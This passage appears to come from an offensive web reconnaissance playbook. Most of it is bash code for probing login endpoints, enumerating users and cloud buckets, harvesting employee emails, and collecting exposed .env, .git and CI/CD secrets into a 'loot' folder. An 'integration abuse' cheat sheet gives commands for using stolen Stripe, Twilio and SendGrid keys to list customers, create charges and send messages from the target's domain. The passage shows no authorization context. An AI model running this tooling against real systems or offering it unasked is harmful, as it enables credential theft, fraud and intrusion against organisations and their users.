  grep -rhoP "https?://[a-z0-9.-]+\.(internal|local|corp|intranet|lan|private)[/a-z0-9._-]*" $JS_DIR/downloaded/ 2>/dev/null
  grep -rhoP "https?://(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)[0-9.]+(?:/[^\s\"']*)??" $JS_DIR/downloaded/ 2>/dev/null

  echo "=== HARDCODED PASSWORDS ==="
  grep -rhoP "(?i)password\s*[=:]\s*['\"][^'\"]{6,}" $JS_DIR/downloaded/ 2>/dev/null
  grep -rhoP "(?i)passwd\s*[=:]\s*['\"][^'\"]{6,}" $JS_DIR/downloaded/ 2>/dev/null
} | tee $JS_DIR/secrets/all_secrets.txt

echo "[*] Secrets found: $(grep -v "^===" $JS_DIR/secrets/all_secrets.txt | grep -c .)"

# GraphQL endpoints from JS
grep -rhoP "(?i)graphql|/gql['\"\`]" $JS_DIR/downloaded/ 2>/dev/null | \
  grep -oP "https?://[^\s\"']+|/[a-z0-9/_-]*graphql[a-z0-9/_-]*" | sort -u \
  >> $WORKSPACE/recon/http/graphql_endpoints.txt

# LinkFinder (if available)
python3 ~/tools/LinkFinder/linkfinder.py -d $JS_DIR/downloaded/ -o cli \
  >> $JS_DIR/endpoints_linkfinder.txt 2>/dev/null
```

## PHASE 8 — AUTHENTICATION SURFACE MAPPING

```bash
TARGET_URL="https://target.com"

# Find auth endpoints
{
  for path in \
    /login /signin /sign-in /auth /authenticate /session \
    /oauth /oauth2 /authorize /token /oauth/authorize /oauth/token \
    /api/login /api/auth /api/token /api/v1/login /api/v1/auth \
    /api/v2/login /user/login /users/login /account/login \
    /admin/login /wp-login.php /wp-admin \
    /register /signup /sign-up /create-account \
    /api/register /api/signup /api/v1/register \
    /forgot-password /reset-password /password-reset \
    /forgot /api/forgot-password /api/reset-password \
    /verify /verify-email /confirm; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" --max-time 5 "${TARGET_URL}${path}" 2>/dev/null)
    [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && echo "$STATUS $path"
  done
} | tee $WORKSPACE/recon/http/auth_endpoints.txt

# OpenID/OAuth discovery
curl -s --max-time 5 "$TARGET_URL/.well-known/openid-configuration" 2>/dev/null | \
  jq . > $WORKSPACE/recon/http/oidc_config.json 2>/dev/null
[ -s $WORKSPACE/recon/http/oidc_config.json ] && \
  echo "[+] OIDC config found!" | tee -a $WORKSPACE/recon/http/auth_endpoints.txt

# Test for user enumeration in login
{
  echo "=== Login error responses ==="
  curl -s -X POST "${TARGET_URL}/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"nonexistent_user_xzzy123@test.com","password":"wrongpassword"}' \
    --max-time 10 2>/dev/null | head -3

  curl -s -X POST "${TARGET_URL}/api/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":"wrongpassword"}' \
    --max-time 10 2>/dev/null | head -3
} | tee $WORKSPACE/recon/http/user_enum_test.txt
```

## PHASE 9 — CREDENTIAL AND SECRET HUNTING

```bash
TARGET_URL="https://target.com"

# Exposed .env and config files
{
  for path in \
    /.env /.env.local /.env.production /.env.dev /.env.staging /.env.test \
    /.env.example /.env.backup /.env.old \
    /config.php /config.js /config.json /config.yaml /config.yml \
    /settings.py /settings.php /database.yml /database.php \
    /wp-config.php /application.properties /application.yml \
    /appsettings.json /web.config /.htaccess /.htpasswd \
    /server.js /app.js /index.js \
    /config/database.yml /config/secrets.yml /config/application.yml; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" --max-time 5 "${TARGET_URL}${path}" 2>/dev/null)
    if [ "$STATUS" = "200" ]; then
      echo "[EXPOSED] $path" | tee -a $WORKSPACE/loot/credentials/exposed_configs.txt
      curl -s --max-time 10 "${TARGET_URL}${path}" >> $WORKSPACE/loot/credentials/exposed_configs.txt
      echo "---" >> $WORKSPACE/loot/credentials/exposed_configs.txt
    fi
  done
} 

# Check .git exposure
GIT_HEAD=$(curl -s --max-time 5 "${TARGET_URL}/.git/HEAD" 2>/dev/null)
if echo "$GIT_HEAD" | grep -q "ref:"; then
  echo "[CRITICAL] .git directory exposed!" | tee $WORKSPACE/loot/credentials/git_exposure.txt
  curl -s "${TARGET_URL}/.git/config" >> $WORKSPACE/loot/credentials/git_exposure.txt
  curl -s "${TARGET_URL}/.git/COMMIT_EDITMSG" >> $WORKSPACE/loot/credentials/git_exposure.txt
  # Full dump
  python3 ~/tools/git-dumper/git_dumper.py "${TARGET_URL}/.git/" \
    $WORKSPACE/loot/credentials/git_repo/ 2>/dev/null || true
fi

# TruffleHog (if available)
trufflehog github --org=$(echo $TARGET | cut -d. -f1) --json \
  > $WORKSPACE/loot/credentials/trufflehog.json 2>/dev/null || true
```

## PHASE 10 — CLOUD STORAGE ENUMERATION

```bash
TARGET="$(echo $TARGET_DOMAIN | cut -d. -f1)"  # base name
TARGET_DOMAIN="target.com"

# Generate bucket name variations
python3 - << 'PYEOF' > /tmp/bucket_names.txt
target = "TARGET_NAME"
domain = "TARGET_DOMAIN"
company = target.replace("-", "").replace(".", "")
variations = set()
for base in [target, company, domain.replace(".", "-"), domain.replace(".", "")]:
    for suffix in ["", "-backup", "-backups", "-data", "-static", "-assets",
                   "-media", "-uploads", "-files", "-public", "-private",
                   "-dev", "-staging", "-prod", "-production", "-test",
                   "-logs", "-images", "-cdn", "-www", "-api"]:
        variations.add(base + suffix)
    for prefix in ["dev-", "staging-", "prod-", "api-", "www-", "app-"]:
        variations.add(prefix + base)
for v in sorted(variations):
    print(v)
PYEOF
sed -i "s/TARGET_NAME/$TARGET/g; s/TARGET_DOMAIN/$TARGET_DOMAIN/g" /tmp/bucket_names.txt

# AWS S3
{
  echo "=== AWS S3 ENUMERATION ==="
  while read bucket; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" --max-time 5 \
      "https://$bucket.s3.amazonaws.com/" 2>/dev/null)
    if [ "$STATUS" = "200" ]; then
      echo "[OPEN] s3://$bucket — public read!"
      curl -s "https://$bucket.s3.amazonaws.com/" | grep -oP "<Key>[^<]+" | sed 's/<Key>//' | head -10
    elif [ "$STATUS" = "403" ]; then
      echo "[EXISTS] s3://$bucket — exists, access denied"
    elif [ "$STATUS" = "301" ]; then
      echo "[REDIRECT] s3://$bucket — exists in different region"
    fi
    # aws CLI without creds
    aws s3 ls s3://$bucket --no-sign-request 2>/dev/null && echo "[OPEN-CLI] $bucket"
  done < /tmp/bucket_names.txt
} | tee $WORKSPACE/recon/cloud/s3_results.txt

# Use s3scanner if available
which s3scanner > /dev/null 2>&1 && \
  s3scanner scan --buckets-file /tmp/bucket_names.txt \
    --out-file $WORKSPACE/recon/cloud/s3scanner.txt 2>/dev/null

# Azure Blob Storage
{
  echo "=== AZURE BLOB STORAGE ==="
  while read bucket; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" --max-time 5 \
      "https://$bucket.blob.core.windows.net/" 2>/dev/null)
    [ "$STATUS" != "000" ] && echo "Account $bucket.blob.core.windows.net -> HTTP $STATUS"
    for container in public static assets media uploads files backup data logs; do
      URL="https://$bucket.blob.core.windows.net/$container?restype=container&comp=list"
      STATUS=$(curl -so /dev/null -w "%{http_code}" --max-time 5 "$URL" 2>/dev/null)
      [ "$STATUS" = "200" ] && {
        echo "[OPEN] $bucket/$container"
        curl -s "$URL" | grep -oP "<Name>[^<]+" | sed 's/<Name>//' | head -10
      }
    done
  done < /tmp/bucket_names.txt
} | tee $WORKSPACE/recon/cloud/azure_results.txt

# GCP Cloud Storage
{
  echo "=== GCP CLOUD STORAGE ==="
  while read bucket; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" --max-time 5 \
      "https://storage.googleapis.com/$bucket/" 2>/dev/null)
    if [ "$STATUS" = "200" ]; then
      echo "[OPEN] gs://$bucket"
      curl -s "https://storage.googleapis.com/$bucket/" | grep -oP "<name>[^<]+" | sed 's/<name>//' | head -10
    elif [ "$STATUS" = "403" ]; then
      echo "[EXISTS] gs://$bucket — access denied"
    fi
    # GCS JSON API
    STATUS2=$(curl -so /dev/null -w "%{http_code}" --max-time 5 \
      "https://www.googleapis.com/storage/v1/b/$bucket/o" 2>/dev/null)
    [ "$STATUS2" = "200" ] && echo "[OPEN-API] gs://$bucket via GCS JSON API"
  done < /tmp/bucket_names.txt
} | tee $WORKSPACE/recon/cloud/gcp_results.txt

# Find cloud URLs in JS
grep -rhoP "https?://[a-z0-9._-]+\.s3[.-][a-z0-9-]+\.amazonaws\.com/[^\s\"']+" \
  $WORKSPACE/recon/js/downloaded/ 2>/dev/null | sort -u >> $WORKSPACE/recon/cloud/cloud_urls_js.txt
grep -rhoP "https?://[a-z0-9-]+\.blob\.core\.windows\.net/[^\s\"']+" \
  $WORKSPACE/recon/js/downloaded/ 2>/dev/null | sort -u >> $WORKSPACE/recon/cloud/cloud_urls_js.txt
grep -rhoP "https?://storage\.googleapis\.com/[^\s\"']+" \
  $WORKSPACE/recon/js/downloaded/ 2>/dev/null | sort -u >> $WORKSPACE/recon/cloud/cloud_urls_js.txt
```

## PHASE 11 — EMAIL AND EMPLOYEE HARVESTING

```bash
TARGET_DOMAIN="target.com"

# theHarvester
theHarvester -d $TARGET_DOMAIN -l 500 -b all \
  -f $WORKSPACE/recon/osint/theharvester 2>/dev/null

# Hunter.io (requires API key)
# curl -s "https://api.hunter.io/v2/domain-search?domain=$TARGET_DOMAIN&api_key=KEY" \
#   | jq . > $WORKSPACE/recon/osint/hunter_io.json

# Generate email format candidates
python3 - << 'PYEOF' > $WORKSPACE/recon/osint/email_formats.txt
domain = "TARGET_DOMAIN"
sample_names = [("john", "smith"), ("jane", "doe"), ("michael", "jones")]
formats = [
    "{first}.{last}@{domain}",
    "{first}{last}@{domain}",
    "{f}{last}@{domain}",
    "{first}{l}@{domain}",
    "{f}.{last}@{domain}",
    "{first}@{domain}",
    "{last}@{domain}",
    "{first}_{last}@{domain}",
    "{last}.{first}@{domain}",
]
for first, last in sample_names:
    f, l = first[0], last[0]
    for fmt in formats:
        print(fmt.format(first=first, last=last, f=f, l=l, domain=domain))
PYEOF
sed -i "s/TARGET_DOMAIN/$TARGET_DOMAIN/g" $WORKSPACE/recon/osint/email_formats.txt

# SMTP user enumeration (if accessible)
MX=$(dig $TARGET_DOMAIN MX +short 2>/dev/null | sort -n | head -1 | awk '{print $2}' | sed 's/\.$//')
if [ -n "$MX" ]; then
  echo "MX server: $MX" | tee $WORKSPACE/recon/osint/smtp_enum.txt
  (echo "VRFY admin@$TARGET_DOMAIN"; sleep 2; echo "QUIT") | nc -w 5 "$MX" 25 2>/dev/null \
    >> $WORKSPACE/recon/osint/smtp_enum.txt
fi

# Breach checking resources
cat > $WORKSPACE/recon/osint/breach_resources.txt << EOF
Manual checks:
https://haveibeenpwned.com/api/v3/breachedaccount/EMAIL
https://dehashed.com/search?query=$TARGET_DOMAIN
https://intelx.io/?s=$TARGET_DOMAIN
https://scylla.so/search?q=$TARGET_DOMAIN
https://snusbase.com/
EOF
```

## PHASE 12 — MOBILE APP RECON

```bash
TARGET_DOMAIN="target.com"

# iOS App Store search
curl -s "https://itunes.apple.com/search?term=$TARGET_DOMAIN&entity=software&limit=5" 2>/dev/null | \
  jq -r '.results[]? | "\(.bundleId) | \(.trackName) v\(.version) | \(.trackViewUrl)"' \
  | tee $WORKSPACE/recon/mobile/ios_apps.txt

IOS_BUNDLE=$(curl -s "https://itunes.apple.com/search?term=$TARGET_DOMAIN&entity=software" 2>/dev/null | \
  jq -r '.results[0]?.bundleId // ""')
IOS_VERSION=$(curl -s "https://itunes.apple.com/search?term=$TARGET_DOMAIN&entity=software" 2>/dev/null | \
  jq -r '.results[0]?.version // ""')
echo "iOS Bundle: $IOS_BUNDLE, Version: $IOS_VERSION" | tee $WORKSPACE/recon/mobile/ios_info.txt

# .well-known mobile app associations
curl -s --max-time 5 "https://$TARGET_DOMAIN/.well-known/assetlinks.json" 2>/dev/null | \
  jq . > $WORKSPACE/recon/mobile/assetlinks.json 2>/dev/null
[ -s $WORKSPACE/recon/mobile/assetlinks.json ] && {
  echo "[+] assetlinks.json found — Android package:"
  jq -r '.[].target.package_name?' $WORKSPACE/recon/mobile/assetlinks.json 2>/dev/null
} | tee -a $WORKSPACE/recon/mobile/ios_info.txt

curl -s --max-time 5 "https://$TARGET_DOMAIN/.well-known/apple-app-site-association" 2>/dev/null | \
  jq . > $WORKSPACE/recon/mobile/apple_app_site.json 2>/dev/null
[ -s $WORKSPACE/recon/mobile/apple_app_site.json ] && {
  echo "[+] apple-app-site-association found — iOS bundle IDs:"
  jq -r '.. | .appID? // empty' $WORKSPACE/recon/mobile/apple_app_site.json 2>/dev/null
}

# Mobile-specific API endpoints
for path in /api/mobile /api/v1/mobile /mobile /app/api /m/api /m/ \
  /api/ios /api/android /api/v2/mobile; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET_DOMAIN$path" 2>/dev/null)
  [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && \
    echo "$STATUS $path" | tee -a $WORKSPACE/recon/mobile/mobile_endpoints.txt
done

# APK analysis (if downloaded)
if [ -f "$WORKSPACE/recon/mobile/app.apk" ]; then
  strings $WORKSPACE/recon/mobile/app.apk | \
    grep -E "https?://[a-z0-9.-]+(\.com|\.net|\.org|\.io)" | sort -u \
    > $WORKSPACE/recon/mobile/apk_urls.txt
  grep -oP "/api/v[0-9]+/[a-z0-9/_-]+" $WORKSPACE/recon/mobile/apk_urls.txt \
    > $WORKSPACE/recon/mobile/apk_api_endpoints.txt
  
  mkdir -p $WORKSPACE/recon/mobile/apk_extracted
  unzip -q "$WORKSPACE/recon/mobile/app.apk" -d $WORKSPACE/recon/mobile/apk_extracted/ 2>/dev/null
  grep -r -E "api[_-]?key|secret|password|token" \
    $WORKSPACE/recon/mobile/apk_extracted/ \
    --include="*.xml" --include="*.json" --include="*.properties" 2>/dev/null \
    > $WORKSPACE/recon/mobile/apk_secrets.txt
fi
```

## PHASE 13 — THIRD-PARTY INTEGRATION DISCOVERY

```bash
TARGET_URL="https://target.com"
JS_DIR=$WORKSPACE/recon/js

{
  echo "=== STRIPE ==="
  curl -s $TARGET_URL 2>/dev/null | grep -i "stripe\|pk_test\|pk_live" | head -3
  grep -rh "stripe\.com\|Stripe\(" $JS_DIR/downloaded/ 2>/dev/null | head -3
  PK=$(grep -rhoP "pk_(test|live)_[A-Za-z0-9]{20,}" $JS_DIR/downloaded/ 2>/dev/null | head -3)
  [ -n "$PK" ] && echo "Stripe public key: $PK" && echo "$PK" >> $WORKSPACE/loot/credentials/stripe_keys.txt

  echo "=== FIREBASE ==="
  FIREBASE_URL=$(grep -rhoP "https://[a-z0-9-]+\.firebaseio\.com" $JS_DIR/downloaded/ 2>/dev/null | head -1)
  if [ -n "$FIREBASE_URL" ]; then
    echo "Firebase DB: $FIREBASE_URL"
    curl -s "${FIREBASE_URL}/.json?shallow=true" --max-time 10 2>/dev/null | head -20 \
      | tee $WORKSPACE/vulns/potential/firebase_open.txt
    curl -s "${FIREBASE_URL}/users.json?shallow=true" --max-time 10 2>/dev/null | head -5 \
      | tee $WORKSPACE/vulns/potential/firebase_users.txt
  fi
  grep -rhoP "AIza[0-9A-Za-z_-]{35}" $JS_DIR/downloaded/ 2>/dev/null | head -3 | \
    tee -a $WORKSPACE/loot/credentials/firebase_api_keys.txt

  echo "=== TWILIO ==="
  grep -rhoP "AC[a-z0-9]{32}" $JS_DIR/downloaded/ 2>/dev/null | head -3 | \
    tee -a $WORKSPACE/loot/credentials/twilio_sids.txt

  echo "=== SENDGRID ==="
  grep -rhoP "SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}" $JS_DIR/downloaded/ 2>/dev/null | head -3 | \
    tee -a $WORKSPACE/loot/credentials/sendgrid_keys.txt

  echo "=== GOOGLE ANALYTICS ==="
  GA=$(curl -s $TARGET_URL 2>/dev/null | grep -oP "UA-\d+-\d+|G-[A-Z0-9]{10,}|GTM-[A-Z0-9]{5,}" | sort -u)
  echo "GA IDs: $GA"

  echo "=== INTERCOM ==="
  grep -rhoP "app_id.*['\"][A-Za-z0-9]{8,}['\"]" $JS_DIR/downloaded/ 2>/dev/null | head -3

  echo "=== SEGMENT ==="
  grep -rhoP "analytics\.load\(['\"][A-Za-z0-9]{20,}" $JS_DIR/downloaded/ 2>/dev/null | head -3

  echo "=== SALESFORCE ==="
  grep -rh "salesforce\.com\|force\.com\|sforce\.com" $JS_DIR/downloaded/ 2>/dev/null | head -3

} | tee $WORKSPACE/recon/tech/integrations.txt

# Integration abuse vector cheatsheet
cat > $WORKSPACE/vulns/research/integration_abuse.txt << 'EOF'
FIREBASE:
  - Open DB: GET https://APP.firebaseio.com/.json?shallow=true
  - Unauthenticated write: PUT https://APP.firebaseio.com/test.json -d '{"pwned":true}'
  - Storage open: curl https://firebasestorage.googleapis.com/v0/b/APP.appspot.com/o
  - Missing rules: read/write all data as any user

STRIPE (if sk_live_ found):
  - List customers: curl https://api.stripe.com/v1/customers -u sk_live_XXX:
  - Create charge: curl https://api.stripe.com/v1/charges -u sk_live_XXX: -d amount=100 -d currency=usd -d source=tok_visa
  - Webhook bypass: forge events if webhook secret exposed

TWILIO (if SID+Auth Token found):
  - Send SMS: curl https://api.twilio.com/2010-04-01/Accounts/SID/Messages -u SID:TOKEN -d To=... -d From=... -d Body=...
  - List calls/SMS: enumerate call logs, phone numbers

SENDGRID (if API key found):
  - Send email: POST https://api.sendgrid.com/v3/mail/send from target's domain
  - List contacts: GET https://api.sendgrid.com/v3/marketing/contacts
EOF
```

## PHASE 14 — CI/CD AND DEVOPS EXPOSURE

```bash
TARGET_URL="https://target.com"
TARGET_DOMAIN="target.com"

# Jenkins detection
for path in /jenkins /jenkins/ /ci /ci/ /build /hudson /; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" --max-time 5 "${TARGET_URL}${path}" 2>/dev/null)
  if [ "$STATUS" = "200" ] || [ "$STATUS" = "302" ]; then
    BODY=$(curl -s --max-time 10 "${TARGET_URL}${path}" 2>/dev/null)
    echo "$BODY" | grep -qi "jenkins\|hudson" && {
      echo "[+] Jenkins at ${TARGET_URL}${path}" | tee -a $WORKSPACE/recon/cicd/jenkins.txt
      # Check API
      curl -s "${TARGET_URL}${path}api/json" 2>/dev/null | jq . | head -20 >> $WORKSPACE/recon/cicd/jenkins.txt
      # Check script console (unauthenticated RCE if accessible)
      SC=$(curl -so /dev/null -w "%{http_code}" "${TARGET_URL}${path}script" 2>/dev/null)
      [ "$SC" = "200" ] && echo "[CRITICAL] Jenkins script console accessible — RCE!" | tee -a $WORKSPACE/recon/cicd/jenkins.txt
      # Check credentials
      curl -s "${TARGET_URL}${path}credentials/store/system/domain/_/api/json" 2>/dev/null | \
        jq . >> $WORKSPACE/recon/cicd/jenkins.txt
    }
  fi
done

# Exposed CI/CD configuration files
for path in \
  /.travis.yml \
  /.circleci/config.yml \
  /Jenkinsfile \
  /.gitlab-ci.yml \
  /bitbucket-pipelines.yml \
  /azure-pipelines.yml \
  /.github/workflows/ci.yml \
  /.github/workflows/cd.yml \
  /.github/workflows/main.yml \
  /.github/workflows/deploy.yml \
  /.github/workflows/build.yml \
  /.github/workflows/release.yml \
  /Makefile \
  /Dockerfile \
  /.dockerignore \
  /docker-compose.yml \
  /docker-compose.yaml \
  /docker-compose.prod.yml; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" --max-time 5 "${TARGET_URL}${path}" 2>/dev/null)
  if [ "$STATUS" = "200" ]; then
    echo "[+] Exposed: $path" | tee -a $WORKSPACE/recon/cicd/exposed_cicd.txt
    curl -s --max-time 10 "${TARGET_URL}${path}" | tee -a $WORKSPACE/recon/cicd/cicd_contents.txt
    # Extract secrets from CI/CD files
    curl -s --max-time 10 "${TARGET_URL}${path}" | \
      grep -iE "password|secret|token|key|api_key|aws|credential" | \
      tee -a $WORKSPACE/loot/credentials/cicd_secrets.txt
    echo "---" >> $WORKSPACE/recon/cicd/cicd_contents.txt
  fi
done

# GitHub org recon
GITHUB_ORG=$(echo $TARGET_DOMAIN | cut -d. -f1)
curl -s "https://api.github.com/orgs/$GITHUB_ORG/repos?per_page=100" 2>/dev/null | \
  jq -r '.[].clone_url' > $WORKSPACE/recon/cicd/github_repos.txt
curl -s "https://api.github.com/orgs/$GITHUB_ORG/members?per_page=100" 2>/dev/null | \
  jq -r '.[].login' > $WORKSPACE/recon/cicd/github_members.txt
echo "GitHub repos: $(wc -l < $WORKSPACE/recon/cicd/github_repos.txt)"

# package.json / composer.json exposure
for manifest in /package.json /package-lock.json /composer.json /requirements.txt \
  /Gemfile /Gemfile.lock /go.mod /Cargo.toml /pom.xml /build.gradle; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" --max-time 5 "${TARGET_URL}${manifest}" 2>/dev/null)
  if [ "$STATUS" = "200" ]; then
    echo "[+] Exposed manifest: $manifest" | tee -a $WORKSPACE/recon/cicd/exposed_manifests.txt
    curl -s --max-time 10 "${TARGET_URL}${manifest}" > $WORKSPACE/recon/cicd/$(basename $manifest).txt
    # Extract dependency list for CVE research
    echo "=== Dependencies from $manifest ===" >> $WORKSPACE/recon/tech/all_dependencies.txt
    curl -s --max-time 10 "${TARGET_URL}${manifest}" | \
      python3 -c "
import json,sys
try:
    d=json.load(sys.stdin)
    deps = dict(list(d.get('dependencies',{}).items()) + list(d.get('devDependencies',{}).items()))
    for k,v in deps.items():
        print(f'{k}@{v}')
except: pass
" 2>/dev/null >> $WORKSPACE/recon/tech/all_dependencies.txt
  fi
done
```

## PHASE SUMMARY

After each phase, record findings in continuous.md:

```bash
# Append to continuous log
cat >> $WORKSPACE/continuous.md << EOF

=== PHASE X COMPLETE — $(date) ===
Subdomains found: $(wc -l < $WORKSPACE/recon/subdomains/all_subdomains.txt 2>/dev/null || echo 0)
Live hosts: $(wc -l < $WORKSPACE/recon/http/live_hosts.txt 2>/dev/null || echo 0)
JS files analyzed: $(ls $WORKSPACE/recon/js/downloaded/*.js 2>/dev/null | wc -l)
Secrets found: $(grep -v "^===" $WORKSPACE/recon/js/secrets/all_secrets.txt 2>/dev/null | grep -c . || echo 0)
Cloud buckets (open): $(grep -c "OPEN" $WORKSPACE/recon/cloud/*.txt 2>/dev/null | awk -F: '{s+=$2}END{print s}')
CI/CD files exposed: $(wc -l < $WORKSPACE/recon/cicd/exposed_cicd.txt 2>/dev/null || echo 0)
High-value vectors:
  - 
  - 
  - 
Next actions:
  1. 
  2. 
  3.
EOF
```

## NUCLEI COMMAND REFERENCE

```bash
# Full web recon
nuclei -u https://target.com \
  -t http/exposures/ \
  -t http/technologies/ \
  -t http/misconfiguration/ \
  -t http/default-logins/ \
  -t http/takeovers/ \
  -t http/cves/ \
  -t ssl/ -t dns/ \
  -severity info,low,medium,high,critical \
  -o $WORKSPACE/vulns/potential/nuclei_full.txt \
  -json -stats -silent

# Run across all live subdomains
nuclei -l $WORKSPACE/recon/http/live_hosts.txt \
  -t http/ \
  -severity medium,high,critical \
  -o $WORKSPACE/vulns/potential/nuclei_subdomains.txt \
  -json -stats -c 25

# Specific categories
nuclei -u https://target.com -t http/cves/ -o $WORKSPACE/vulns/potential/nuclei_cves.txt
nuclei -u https://target.com -t http/exposed-panels/ -o $WORKSPACE/vulns/potential/nuclei_panels.txt
nuclei -u https://target.com -t http/fuzzing/ -o $WORKSPACE/vulns/potential/nuclei_fuzzing.txt
nuclei -u https://target.com -t http/takeovers/ -o $WORKSPACE/vulns/potential/nuclei_takeovers.txt
```

## TOOL QUICK REFERENCE

```
subfinder      — Passive subdomain enumeration (100+ sources)
amass          — Active/passive subdomain enumeration + DNS brute
dnsx           — DNS resolution, A/CNAME/MX probing
httpx          — HTTP probing, status, title, tech detection
katana         — Active web crawler (follows JS, forms)
gau            — All URLs from Wayback/CommonCrawl/OTX/urlscan
waybackurls    — Wayback Machine URL extraction
ffuf           — Fast web fuzzer (dirs, files, params, vhosts)
arjun          — HTTP parameter discovery
nuclei         — Template-based vulnerability scanner
whatweb        — Web technology fingerprinting
wafw00f        — WAF detection and fingerprinting
s3scanner      — AWS S3 bucket permission scanner
subzy          — Subdomain takeover detection
theHarvester   — OSINT email/employee/subdomain harvesting
trufflehog     — Secret scanning across git history
shodan         — Internet-wide device search
```
